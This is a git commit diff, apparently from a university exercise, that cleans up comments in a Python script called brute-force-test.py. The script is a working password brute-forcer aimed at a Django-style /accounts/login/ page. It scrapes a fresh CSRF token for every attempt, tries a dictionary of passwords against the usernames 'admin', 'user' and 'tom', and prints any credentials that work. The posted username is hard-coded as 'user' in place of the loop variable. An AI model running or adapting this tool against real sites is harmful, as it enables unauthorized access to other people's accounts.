ce6ef8dd3e6a962167d54c564cc523e8cd4d1c69
akuisman <akuisman@abo.fi>
2022-04-21 10:39:04 +0300

    Removed some comments

--- brute-force-test.py
+++ brute-force-test.py
@@ -15,13 +15,9 @@ class Terminal(Cmd):
         
 def bruteforcer(url):
     session = requests.session()
-    #login = session.get(f"{url}/accounts/login/")
-    #print(login.text)
-    #csrf_token = re.search('name="csrfmiddlewaretoken" value="([0-9a-zA-z]+)"', login.text)
-    #if csrf_token:
-    #    csrf_token = csrf_token.group(1)
-        
+	#List of usernames to try
     usernames = ['admin', 'user', 'tom']
+	#Open dictionary file with passwords to try
     with open("/home/antti/common_roots.txt", "r") as file:
         content = file.readlines()
         passwords = [x.strip() for x in content]
@@ -29,13 +25,11 @@ def bruteforcer(url):
         for username in usernames:
             for password in passwords:
                 login = session.get(f"{url}/accounts/login/")
-                #print(login.text)
                 #Get a new csrf token each time we try a new password.  
                 csrf_token = re.search('name="csrfmiddlewaretoken" value="([0-9a-zA-z]+)"', login.text)
                 if csrf_token:
                     csrf_token = csrf_token.group(1)
-                    #print(f"csrf_token: {csrf_token}\n")
-                #print(password)
+                    
                 post_data = {
                     "username" : 'user',
                     "password" : password,
@@ -44,12 +38,9 @@ def bruteforcer(url):
                 }
                 print(post_data)
                 validation = session.post(f"{url}/accounts/login/", data=post_data)
-                #print (validation.text)
-                #time.sleep(10)
             
                 if "Your username and password didn't match. Please try again." in validation.text:
                     pass
-                #elif "CSRF verification failed. Request aborted." 
                 elif "CSRF token missing." in validation.text:
                     print("CSRF token is incorrect")
                     sys.exit()
@@ -57,8 +48,6 @@ def bruteforcer(url):
                     print (f"Login success\n Your credentials are below\n {post_data['username']}:{password}")
                     print("Goodbye")
                     sys.exit()
-    #print(f"csrf-token: {csrf_token}\n")
-    #print(f"{url}\n")
     
 if __name__ == ("__main__"):
     terminal = Terminal()
